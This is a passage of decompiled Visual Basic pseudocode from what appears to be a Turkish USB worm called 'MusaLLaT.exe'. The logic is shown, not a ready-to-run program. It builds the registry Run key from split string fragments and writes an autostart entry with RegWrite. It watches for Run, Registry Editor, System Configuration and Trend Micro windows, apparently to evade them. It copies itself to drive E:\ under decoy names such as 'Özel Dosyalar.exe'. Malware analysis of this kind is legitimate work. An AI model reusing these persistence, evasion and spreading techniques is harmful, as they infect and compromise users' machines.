  loc_0045A95F: var_8244 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045A972: call var_8248 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045A98A: call var_824C = global_00401148
  loc_0045A998: call var_8250 = global_00401148
  loc_0045A9A6: call var_8254 = global_00401148
  loc_0045A9C9: var_8258 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045A9DC: call var_825C = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045A9F4: call var_8260 = global_00401148
  loc_0045AA02: call var_8264 = global_00401148
  loc_0045AA10: call var_8268 = global_00401148
  loc_0045AA33: var_826C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AA46: call var_8270 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AA5E: call var_8274 = global_00401148
  loc_0045AA6C: call var_8278 = global_00401148
  loc_0045AA7A: call var_827C = global_00401148
  loc_0045AA9D: var_8280 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AAB0: call var_8284 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AAC8: call var_8288 = global_00401148
  loc_0045AAD6: call var_828C = global_00401148
  loc_0045AAE4: call var_8290 = global_00401148
  loc_0045AB07: var_8294 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AB1A: call var_8298 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AB32: call var_829C = global_00401148
  loc_0045AB40: call var_82A0 = global_00401148
  loc_0045AB4E: call var_82A4 = global_00401148
  loc_0045AB71: var_82A8 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AB84: call var_82AC = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AB9C: call var_82B0 = global_00401148
  loc_0045ABAA: call var_82B4 = global_00401148
  loc_0045ABB8: call var_82B8 = global_00401148
  loc_0045ABDB: var_82BC = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045ABEE: call var_82C0 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AC06: call var_82C4 = global_00401148
  loc_0045AC14: call var_82C8 = global_00401148
  loc_0045AC22: call var_82CC = global_00401148
  loc_0045AC45: var_82D0 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AC58: call var_82D4 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AC70: call var_82D8 = global_00401148
  loc_0045AC7E: call var_82DC = global_00401148
  loc_0045AC8C: call var_82E0 = global_00401148
  loc_0045ACAF: var_82E4 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045ACC2: call var_82E8 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045ACDA: call var_82EC = global_00401148
  loc_0045ACE8: call var_82F0 = global_00401148
  loc_0045ACF6: call var_82F4 = global_00401148
  loc_0045AD19: var_82F8 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AD2C: call var_82FC = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AD44: call var_8300 = global_00401148
  loc_0045AD52: call var_8304 = global_00401148
  loc_0045AD60: call var_8308 = global_00401148
  loc_0045AD83: var_830C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AD96: call var_8310 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045ADAE: call var_8314 = global_00401148
  loc_0045ADBC: call var_8318 = global_00401148
  loc_0045ADCA: call var_831C = global_00401148
  loc_0045ADED: var_8320 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AE00: call var_8324 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AE18: call var_8328 = global_00401148
  loc_0045AE26: call var_832C = global_00401148
  loc_0045AE34: call var_8330 = global_00401148
  loc_0045AE57: var_8334 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AE6A: call var_8338 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AE82: call var_833C = global_00401148
  loc_0045AE90: call var_8340 = global_00401148
  loc_0045AE9E: call var_8344 = global_00401148
  loc_0045AEC1: var_8348 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AED4: call var_834C = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AEEC: call var_8350 = global_00401148
  loc_0045AEFA: call var_8354 = global_00401148
  loc_0045AF08: call var_8358 = global_00401148
  loc_0045AF2B: var_835C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045AF3E: call var_8360 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AF56: call var_8364 = global_00401148
  loc_0045AF64: call var_8368 = global_00401148
  loc_0045AF72: call var_836C = global_00401148
  loc_0045AF95: var_8370 = Proc_1_0_45B780(80000001h, var_34, var_38)
  loc_0045AFA8: call var_8374 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045AFC0: call var_8378 = global_00401148
  loc_0045AFCE: call var_837C = global_00401148
  loc_0045AFDC: call var_8380 = global_00401148
  loc_0045AFFF: var_8384 = Proc_1_0_45B780(80000003h, var_34, var_38)
  loc_0045B012: call var_8388 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B02A: call var_838C = global_00401148
  loc_0045B038: call var_8390 = global_00401148
  loc_0045B046: call var_8394 = global_00401148
  loc_0045B069: var_8398 = Proc_1_0_45B780(80000001h, var_34, var_38)
  loc_0045B07C: call var_839C = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B094: call var_83A0 = global_00401148
  loc_0045B0A2: call var_83A4 = global_00401148
  loc_0045B0B0: call var_83A8 = global_00401148
  loc_0045B0D3: var_83AC = Proc_1_0_45B780(80000001h, var_34, var_38)
  loc_0045B0E6: call var_83B0 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B0FE: call var_83B4 = global_00401148
  loc_0045B10C: call var_83B8 = global_00401148
  loc_0045B11A: call var_83BC = global_00401148
  loc_0045B13D: var_83C0 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B150: call var_83C4 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B168: call var_83C8 = global_00401148
  loc_0045B176: call var_83CC = global_00401148
  loc_0045B184: call var_83D0 = global_00401148
  loc_0045B1A7: var_83D4 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B1BA: call var_83D8 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B1D2: call var_83DC = global_00401148
  loc_0045B1E0: call var_83E0 = global_00401148
  loc_0045B1EE: call var_83E4 = global_00401148
  loc_0045B211: var_83E8 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B224: call var_83EC = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B23C: call var_83F0 = global_00401148
  loc_0045B24A: call var_83F4 = global_00401148
  loc_0045B258: call var_83F8 = global_00401148
  loc_0045B27B: var_83FC = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B28E: call var_8400 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B2A6: call var_8404 = global_00401148
  loc_0045B2B4: call var_8408 = global_00401148
  loc_0045B2C2: call var_840C = global_00401148
  loc_0045B2E5: var_8410 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B2F8: call var_8414 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B310: call var_8418 = global_00401148
  loc_0045B31E: call var_841C = global_00401148
  loc_0045B32C: call var_8420 = global_00401148
  loc_0045B34F: var_8424 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B362: call var_8428 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B37A: call var_842C = global_00401148
  loc_0045B388: call var_8430 = global_00401148
  loc_0045B396: call var_8434 = global_00401148
  loc_0045B3B9: var_8438 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B3CC: call var_843C = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B3E4: call var_8440 = global_00401148
  loc_0045B3F2: call var_8444 = global_00401148
  loc_0045B400: call var_8448 = global_00401148
  loc_0045B423: var_844C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B436: call var_8450 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B44E: call var_8454 = global_00401148
  loc_0045B45C: call var_8458 = global_00401148
  loc_0045B46A: call var_845C = global_00401148
  loc_0045B48D: var_8460 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B4A0: call var_8464 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B4B8: call var_8468 = global_00401148
  loc_0045B4C6: call var_846C = global_00401148
  loc_0045B4D4: call var_8470 = global_00401148
  loc_0045B4F7: var_8474 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B50A: call var_8478 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B522: call var_847C = global_00401148
  loc_0045B530: call var_8480 = global_00401148
  loc_0045B53E: call var_8484 = global_00401148
  loc_0045B561: var_8488 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B574: call var_848C = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B58C: call var_8490 = global_00401148
  loc_0045B59A: call var_8494 = global_00401148
  loc_0045B5A8: call var_8498 = global_00401148
  loc_0045B5CB: var_849C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B5DE: call var_84A0 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B5F6: call var_84A4 = global_00401148
  loc_0045B604: call var_84A8 = global_00401148
  loc_0045B612: call var_84AC = global_00401148
  loc_0045B635: var_84B0 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B648: call var_84B4 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B660: call var_84B8 = global_00401148
  loc_0045B66E: call var_84BC = global_00401148
  loc_0045B67C: call var_84C0 = global_00401148
  loc_0045B69F: var_84C4 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045B6B2: call var_84C8 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045B6C7: GoTo loc_0045B74F
  loc_0045B72C: call var_84CC = global_00401150(00000016h, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60, var_64, var_68, var_6C)
  loc_0045B745: call var_84D0 = global_00401024(00000002h, var_98, var_A8)
  loc_0045B74E: Exit Sub
  loc_0045B74F: ' Referenced from: 0045B6C7
  loc_0045B752: call var_84D4 = global_00401014
End Sub

Private Sub Timer12_Timer() '444F60
  loc_00444F66: ext_4010EC
  loc_00444F7E: ext_40109C
  loc_00444FC5: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_00444FDA: call var_8008 = global_00401148
  loc_00444FED: var_800C = Form1.Proc_0_16_43BC60(var_24)
  loc_00444FF6: call var_8010 = global_004011CC
  loc_00445008: GoTo loc_00445014
  loc_0044500D: call var_8014 = global_004011CC(global_00445015)
  loc_00445013: Exit Sub
  loc_00445014: ' Referenced from: 00445008
End Sub

Private Sub Timer3_Timer() '448640
  loc_00448646: ext_4010EC
  loc_0044865E: ext_40109C
  loc_004486A5: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_004486C9: call var_8008 = global_00401078(var_88, Form1.Text2)
  loc_004486CF: var_110 = var_8008
  loc_004486E8: var_34 = var_110.UnkVCall_000000A0h
  loc_004486F0: var_114 = var_34
  loc_004486FD: If var_114 < 0 Then
  loc_00448717:   call var_800C = global_00401058(var_114, var_110, global_00418EA4, 000000A0h)
  loc_0044871D:   var_154 = var_800C
  loc_00448725: Else
  loc_0044872F: End If
  loc_00448743: call var_8010 = global_00401078(var_7C, Form1.Text2)
  loc_00448749: var_118 = var_8010
  loc_00448762: var_28 = var_118.UnkVCall_000000A0h
  loc_0044876A: var_11C = var_28
  loc_00448777: If var_11C < 0 Then
  loc_00448791:   call var_8014 = global_00401058(var_11C, var_118, global_00418EA4, 000000A0h)
  loc_00448797:   var_158 = var_8014
  loc_0044879F: Else
  loc_004487A9: End If
  loc_004487BD: call var_8018 = global_00401078(var_80, Form1.Text2)
  loc_004487C3: var_120 = var_8018
  loc_004487DC: var_2C = var_120.UnkVCall_000000A0h
  loc_004487E4: var_124 = var_2C
  loc_004487F1: If var_124 < 0 Then
  loc_0044880B:   call var_801C = global_00401058(var_124, var_120, global_00418EA4, 000000A0h)
  loc_00448811:   var_15C = var_801C
  loc_00448819: Else
  loc_00448823: End If
  loc_0044883A: call var_8020 = global_00401078(var_84, Form1.Text2)
  loc_00448840: var_128 = var_8020
  loc_00448859: var_30 = var_128.UnkVCall_000000A0h
  loc_00448861: var_12C = var_30
  loc_0044886E: If var_12C < 0 Then
  loc_00448888:   call var_8024 = global_00401058(var_12C, var_128, global_00418EA4, 000000A0h)
  loc_0044888E:   var_160 = var_8024
  loc_00448896: Else
  loc_004488A0: End If
  loc_004488A9: call var_8028 = global_004010B0("Çalýþtýr", var_28)
  loc_004488C1: call var_802C = global_004010B0("Sistem Yapýlandýrma Yardýmcý Programý", var_2C)
  loc_004488DA: call var_8030 = global_004010B0("Kayýt Defteri Düzenleyicisi", var_30)
  loc_004488EA: var_F4 = var_8030 + 1
  loc_00448911: var_94 = var_34
  loc_00448931: call var_8034 = global_004011A4(var_AC, var_9C, 0000000Bh)
  loc_00448937: var_E4 = "Trend Micro"
  loc_00448962: call var_8038 = global_00401078(var_8C, Form1.Text2)
  loc_00448968: var_130 = var_8038
  loc_00448981: var_38 = var_130.UnkVCall_000000A0h
  loc_00448989: var_134 = var_38
  loc_00448996: If var_134 < 0 Then
  loc_004489B0:   call var_803C = global_00401058(var_134, var_130, global_00418EA4, 000000A0h)
  loc_004489B6:   var_164 = var_803C
  loc_004489BE: Else
  loc_004489C8: End If
  loc_004489D1: call var_8040 = global_004010B0("Sistem Yapýlandýrmasý", var_38)
  loc_004489DE: var_104 = var_8040 + 1
  loc_00448A0B: call var_8044 = global_00401174(var_BC, var_EC, var_AC, var_FC)
  loc_00448A19: call var_8048 = global_004010C8(var_CC, var_8044)
  loc_00448A2E: call var_804C = global_004010C8(var_DC, var_10C, var_8048)
  loc_00448A35: call var_8050 = global_00401090(var_804C)
  loc_00448A54: call var_8054 = global_00401150(00000004h, var_28, var_2C, var_30, var_38)
  loc_00448A7C: call var_8058 = global_0040102C(00000005h, var_7C, var_80, var_84, var_88, var_8C)
  loc_00448AA3: call var_805C = global_00401024(00000004h, var_9C, var_AC, var_FC, var_10C)
  loc_00448AB5: If var_8050 Then
  loc_00448AD6:   call var_8060 = global_00401078(var_7C, Form1.Timer4)
  loc_00448ADC:   var_110 = var_8060
  loc_00448AF3:   var_110.UnkVCall_0000005Ch
  loc_00448AF8:   var_114 = var_110.UnkVCall_0000005Ch
  loc_00448B05:   If var_114 < 0 Then
  loc_00448B1C:     call var_8064 = global_00401058(var_114, var_110, global_0041925C, 0000005Ch, var_110, FFFFFFFFh)
  loc_00448B22:     var_168 = var_8064
  loc_00448B2A:   Else
  loc_00448B34:   End If
  loc_00448B37:   call var_8068 = global_004011D4
  loc_00448B42: Else
  loc_00448B5D:   call var_806C = global_00401078(var_7C, Form1.Timer4)
  loc_00448B63:   var_110 = var_806C
  loc_00448B7A:   var_110.UnkVCall_0000005Ch
  loc_00448B7F:   var_114 = var_110.UnkVCall_0000005Ch
  loc_00448B8C:   If var_114 < 0 Then
  loc_00448BA3:     call var_8070 = global_00401058(var_114, var_110, global_0041925C, 0000005Ch, var_110, 00000000h)
  loc_00448BA9:     var_16C = var_8070
  loc_00448BB1:   Else
  loc_00448BBB:   End If
  loc_00448BBE:   call var_8074 = global_004011D4
  loc_00448BD7:   call var_8078 = global_00401044("ri", "wsc", 00000000h)
  loc_00448BE2:   call var_807C = global_004011AC
  loc_00448BEE:   call var_8080 = global_00401044("pt.s", var_807C)
  loc_00448BF9:   call var_8084 = global_004011AC
  loc_00448C05:   call var_8088 = global_00401044("he", var_8084)
  loc_00448C10:   call var_808C = global_004011AC
  loc_00448C1C:   call var_8090 = global_00401044("ll", var_808C)
  loc_00448C27:   call var_8094 = global_004011AC
  loc_00448C35:   call var_8098 = global_00401108(var_9C, var_8094)
  loc_00448C42:   call var_809C = global_004010C0(var_9C)
  loc_00448C4D:   call var_80A0 = global_00401080(var_24, var_809C)
  loc_00448C65:   call var_80A4 = global_00401150(00000004h, var_28, var_2C, var_30, var_34)
  loc_00448C74:   call var_80A8 = global_00401014
  loc_00448C88:   If global_00460558 = 0 Then
  loc_00448C94:     call var_80AC = global_00401134(global_00418EE0, global_00460558)
  loc_00448C9A:     var_170 = global_00460558
  loc_00448CA6:   Else
  loc_00448CB0:   End If
  loc_00448CB8:   var_110 = var_170
  loc_00448CD1:   var_7C = var_110.UnkVCall_00000014h
  loc_00448CD6:   var_114 = var_7C
  loc_00448CE3:   If var_114 < 0 Then
  loc_00448CFA:     call var_80B0 = global_00401058(var_114, var_110, global_00418ED0, 00000014h)
  loc_00448D00:     var_174 = var_80B0
  loc_00448D08:   Else
  loc_00448D12:   End If
  loc_00448D15:   var_118 = var_7C
  loc_00448D2E:   var_68 = var_118.UnkVCall_00000058h
  loc_00448D33:   var_11C = var_68
  loc_00448D40:   If var_11C < 0 Then
  loc_00448D57:     call var_80B4 = global_00401058(var_11C, var_118, global_00418EF0, 00000058h)
  loc_00448D5D:     var_178 = var_80B4
  loc_00448D65:   Else
  loc_00448D6F:   End If
  loc_00448D79:   call var_80B8 = global_00401044("Y_CU", "HKE")
  loc_00448D84:   call var_80BC = global_004011AC
  loc_00448D90:   call var_80C0 = global_00401044("RREN", var_80BC)
  loc_00448D9B:   call var_80C4 = global_004011AC
  loc_00448DA7:   call var_80C8 = global_00401044("T_US", var_80C4)
  loc_00448DB2:   call var_80CC = global_004011AC
  loc_00448DBE:   call var_80D0 = global_00401044("ER\SO", var_80CC)
  loc_00448DC9:   call var_80D4 = global_004011AC
  loc_00448DD5:   call var_80D8 = global_00401044("FTW", var_80D4)
  loc_00448DE0:   call var_80DC = global_004011AC
  loc_00448DEC:   call var_80E0 = global_00401044("ARE", var_80DC)
  loc_00448DF7:   call var_80E4 = global_004011AC
  loc_00448E03:   call var_80E8 = global_00401044("\Mi", var_80E4)
  loc_00448E0E:   call var_80EC = global_004011AC
  loc_00448E1A:   call var_80F0 = global_00401044("cro", var_80EC)
  loc_00448E25:   call var_80F4 = global_004011AC
  loc_00448E31:   call var_80F8 = global_00401044("soft", var_80F4)
  loc_00448E3C:   call var_80FC = global_004011AC
  loc_00448E48:   call var_8100 = global_00401044("\Wi", var_80FC)
  loc_00448E53:   call var_8104 = global_004011AC
  loc_00448E5F:   call var_8108 = global_00401044("ndo", var_8104)
  loc_00448E6A:   call var_810C = global_004011AC
  loc_00448E76:   call var_8110 = global_00401044("ws\Cu", var_810C)
  loc_00448E81:   call var_8114 = global_004011AC
  loc_00448E8D:   call var_8118 = global_00401044("rren", var_8114)
  loc_00448E98:   call var_811C = global_004011AC
  loc_00448EA4:   call var_8120 = global_00401044("tVer", var_811C)
  loc_00448EAF:   call var_8124 = global_004011AC
  loc_00448EBB:   call var_8128 = global_00401044("sion\R", var_8124)
  loc_00448EC6:   call var_812C = global_004011AC
  loc_00448ED2:   call var_8130 = global_00401044("un", var_812C)
  loc_00448EDD:   call var_8134 = global_004011AC
  loc_00448EE9:   call var_8138 = global_00401044("\", var_8134)
  loc_00448EF4:   call var_813C = global_004011AC
  loc_00448EFF:   call var_8140 = global_00401044(var_68, var_813C)
  loc_00448F05:   var_94 = var_8140
  loc_00448F1C:   If global_00460558 = 0 Then
  loc_00448F28:     call var_8144 = global_00401134(global_00418EE0, global_00460558)
  loc_00448F2E:     var_17C = global_00460558
  loc_00448F3A:   Else
  loc_00448F44:   End If
  loc_00448F4C:   var_120 = var_17C
  loc_00448F65:   var_80 = var_120.UnkVCall_00000014h
  loc_00448F6A:   var_124 = var_80
  loc_00448F77:   If var_124 < 0 Then
  loc_00448F8E:     call var_8148 = global_00401058(var_124, var_120, global_00418ED0, 00000014h)
  loc_00448F94:     var_180 = var_8148
  loc_00448F9C:   Else
  loc_00448FA6:   End If
  loc_00448FA9:   var_128 = var_80
  loc_00448FC2:   var_70 = var_128.UnkVCall_00000050h
  loc_00448FC7:   var_12C = var_70
  loc_00448FD4:   If var_12C < 0 Then
  loc_00448FEB:     call var_814C = global_00401058(var_12C, var_128, global_00418EF0, 00000050h)
  loc_00448FF1:     var_184 = var_814C
  loc_00448FF9:   Else
  loc_00449003:   End If
  loc_0044900C:   call var_8150 = global_00401044("\Mu", var_70)
  loc_00449017:   call var_8154 = global_004011AC
  loc_00449023:   call var_8158 = global_00401044("sa", var_8154)
  loc_0044902E:   call var_815C = global_004011AC
  loc_0044903A:   call var_8160 = global_00401044("LLaT.exe", var_815C)
  loc_00449040:   var_A4 = var_8160
  loc_00449055:   ext_40109C
  loc_00449084:   ext_40109C
  loc_004490B9:   call var_8164 = global_00401184(var_24, "RegWrite", 00000002h, var_AC)
  loc_00449118:   call var_8168 = global_00401150(00000015h, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60)
  loc_0044912B:   call var_816C = global_0040102C(00000002h, var_7C, var_80)
  loc_00449144:   call var_8170 = global_00401024(00000002h, var_9C, var_AC)
  loc_0044914D: End If
  loc_00449164: var_9C = Form1.TypeWindow
  loc_0044916A: var_110 = var_9C
  loc_00449177: If var_110 < 0 Then
  loc_0044918E:   call var_8174 = global_00401058(var_110, Me, global_00418934, 000006FCh)
  loc_00449194:   var_188 = var_8174
  loc_0044919C: Else
  loc_004491A6: End If
  loc_004491AC: call var_8178 = global_00401014
  loc_004491BE: GoTo loc_00449279
  loc_00449219: call var_817C = global_00401150(00000015h, var_28, var_2C, var_30, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60)
  loc_00449241: call var_8180 = global_0040102C(00000005h, var_7C, var_80, var_84, var_88, var_8C)
  loc_0044926F: call var_8184 = global_00401024(00000005h, var_9C, var_AC, var_BC, var_CC, var_DC)
  loc_00449278: Exit Sub
  loc_00449279: ' Referenced from: 004491BE
  loc_0044927C: call var_8188 = global_004011D4
End Sub

Private Sub Timer1_Timer() '43DDA0
  loc_0043DDA6: ext_4010EC
  loc_0043DDBE: ext_40109C
  loc_0043DE05: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_0043DE12: var_F8 = "E:\"
  loc_0043DE32: call var_8008 = global_0040118C
  loc_0043DE41: call var_800C = global_00401120(var_D0, 00000000h)
  loc_0043DE4F: call var_8010 = global_004011AC
  loc_0043DE5B: call var_8014 = global_004010B0(global_00418DE4, var_8010)
  loc_0043DE69: var_118 = var_8014
  loc_0043DEA7: call var_8018 = global_00401174(var_E0, &H800B, var_70, var_120)
  loc_0043DEB5: call var_801C = global_004010E4(var_F0, var_8018)
  loc_0043DEBC: call var_8020 = global_00401090(var_801C)
  loc_0043DECF: call var_8024 = global_004011CC
  loc_0043DEE5: call var_8028 = global_00401024(00000002h, var_D0, var_120)
  loc_0043DEF7: If var_8020 Then
  loc_0043DF0B:   If global_00460558 = 0 Then
  loc_0043DF17:     call var_802C = global_00401134(global_00418EE0, global_00460558)
  loc_0043DF1D:     var_158 = global_00460558
  loc_0043DF29:   Else
  loc_0043DF33:   End If
  loc_0043DF3B:   var_124 = var_158
  loc_0043DF57:   var_BC = var_124.UnkVCall_00000014h
  loc_0043DF5C:   var_128 = var_BC
  loc_0043DF69:   If var_128 < 0 Then
  loc_0043DF80:     call var_8030 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043DF86:     var_15C = var_8030
  loc_0043DF8E:   Else
  loc_0043DF98:   End If
  loc_0043DF9E:   var_12C = var_BC
  loc_0043DFBA:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043DFBF:   var_130 = var_A4
  loc_0043DFCC:   If var_130 < 0 Then
  loc_0043DFE3:     call var_8034 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043DFE9:     var_160 = var_8034
  loc_0043DFF1:   Else
  loc_0043DFFB:   End If
  loc_0043E002:   If global_00460558 = 0 Then
  loc_0043E00E:     call var_8038 = global_00401134(global_00418EE0, global_00460558)
  loc_0043E014:     var_164 = global_00460558
  loc_0043E020:   Else
  loc_0043E02A:   End If
  loc_0043E032:   var_134 = var_164
  loc_0043E04E:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043E053:   var_138 = var_C0
  loc_0043E060:   If var_138 < 0 Then
  loc_0043E077:     call var_803C = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043E07D:     var_168 = var_803C
  loc_0043E085:   Else
  loc_0043E08F:   End If
  loc_0043E095:   var_13C = var_C0
  loc_0043E0B1:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043E0B6:   var_140 = var_A8
  loc_0043E0C3:   If var_140 < 0 Then
  loc_0043E0DA:     call var_8040 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043E0E0:     var_16C = var_8040
  loc_0043E0E8:   Else
  loc_0043E0F2:   End If
  loc_0043E103:   call var_8044 = global_00401044("\", var_A4, "E:\MusaLLaT.exe")
  loc_0043E111:   call var_8048 = global_004011AC
  loc_0043E11F:   call var_804C = global_00401044(var_A8, var_8048)
  loc_0043E12D:   call var_8050 = global_004011AC
  loc_0043E139:   call var_8054 = global_00401044(".exe", var_8050)
  loc_0043E147:   call var_8058 = global_004011AC
  loc_0043E14E:   call var_805C = global_00401158(var_8058)
  loc_0043E179:   call var_8060 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043E192:   call var_8064 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043E1A2:   var_F8 = "E:\Özel Dosyalar.exe"
  loc_0043E1C2:   call var_8068 = global_0040118C
  loc_0043E1D1:   call var_806C = global_00401120(var_D0, 00000000h)
  loc_0043E1DF:   call var_8070 = global_004011AC
  loc_0043E1EB:   call var_8074 = global_004010B0(global_00418DE4, var_8070)
  loc_0043E1F9:   var_118 = var_8074
  loc_0043E237:   call var_8078 = global_00401174(var_E0, &H800B, var_70, var_120)
  loc_0043E245:   call var_807C = global_004010E4(var_F0, var_8078)
  loc_0043E24C:   call var_8080 = global_00401090(var_807C)
  loc_0043E25F:   call var_8084 = global_004011CC
  loc_0043E275:   call var_8088 = global_00401024(00000002h, var_D0, var_120)
  loc_0043E287:   If var_8080 Then
  loc_0043E289:     GoTo loc_0043E52C
  loc_0043E28E:   End If
  loc_0043E29C:   If global_00460558 = 0 Then
  loc_0043E2A8:     call var_808C = global_00401134(global_00418EE0, global_00460558)
  loc_0043E2AE:     var_170 = global_00460558
  loc_0043E2BA:   Else
  loc_0043E2C4:   End If
  loc_0043E2CC:   var_124 = var_170
  loc_0043E2E8:   var_BC = var_124.UnkVCall_00000014h
  loc_0043E2ED:   var_128 = var_BC
  loc_0043E2FA:   If var_128 < 0 Then
  loc_0043E311:     call var_8090 = global_00401058(var_128, var_124, global_00418ED0, 00000014h)
  loc_0043E317:     var_174 = var_8090
  loc_0043E31F:   Else
  loc_0043E329:   End If
  loc_0043E32F:   var_12C = var_BC
  loc_0043E34B:   var_A4 = var_12C.UnkVCall_00000050h
  loc_0043E350:   var_130 = var_A4
  loc_0043E35D:   If var_130 < 0 Then
  loc_0043E374:     call var_8094 = global_00401058(var_130, var_12C, global_00418EF0, 00000050h)
  loc_0043E37A:     var_178 = var_8094
  loc_0043E382:   Else
  loc_0043E38C:   End If
  loc_0043E393:   If global_00460558 = 0 Then
  loc_0043E39F:     call var_8098 = global_00401134(global_00418EE0, global_00460558)
  loc_0043E3A5:     var_17C = global_00460558
  loc_0043E3B1:   Else
  loc_0043E3BB:   End If
  loc_0043E3C3:   var_134 = var_17C
  loc_0043E3DF:   var_C0 = var_134.UnkVCall_00000014h
  loc_0043E3E4:   var_138 = var_C0
  loc_0043E3F1:   If var_138 < 0 Then
  loc_0043E408:     call var_809C = global_00401058(var_138, var_134, global_00418ED0, 00000014h)
  loc_0043E40E:     var_180 = var_809C
  loc_0043E416:   Else
  loc_0043E420:   End If
  loc_0043E426:   var_13C = var_C0
  loc_0043E442:   var_A8 = var_13C.UnkVCall_00000058h
  loc_0043E447:   var_140 = var_A8
  loc_0043E454:   If var_140 < 0 Then
  loc_0043E46B:     call var_80A0 = global_00401058(var_140, var_13C, global_00418EF0, 00000058h)
  loc_0043E471:     var_184 = var_80A0
  loc_0043E479:   Else
  loc_0043E483:   End If
  loc_0043E494:   call var_80A4 = global_00401044("\", var_A4, "E:\Özel Dosyalar.exe")
  loc_0043E4A2:   call var_80A8 = global_004011AC
  loc_0043E4B0:   call var_80AC = global_00401044(var_A8, var_80A8)
  loc_0043E4BE:   call var_80B0 = global_004011AC
  loc_0043E4CA:   call var_80B4 = global_00401044(".exe", var_80B0)
  loc_0043E4D8:   call var_80B8 = global_004011AC
  loc_0043E4DF:   call var_80BC = global_00401158(var_80B8)
  loc_0043E50A:   call var_80C0 = global_00401150(00000005h, var_A4, var_AC, var_A8, var_B0, var_B4)
  loc_0043E523:   call var_80C4 = global_0040102C(00000002h, var_BC, var_C0)
  loc_0043E52C:   ' Referenced from: 0043E289
  loc_0043E53D:   call var_80C8 = global_00401044("ut", "E:\a")
  loc_0043E54B:   call var_80CC = global_004011AC
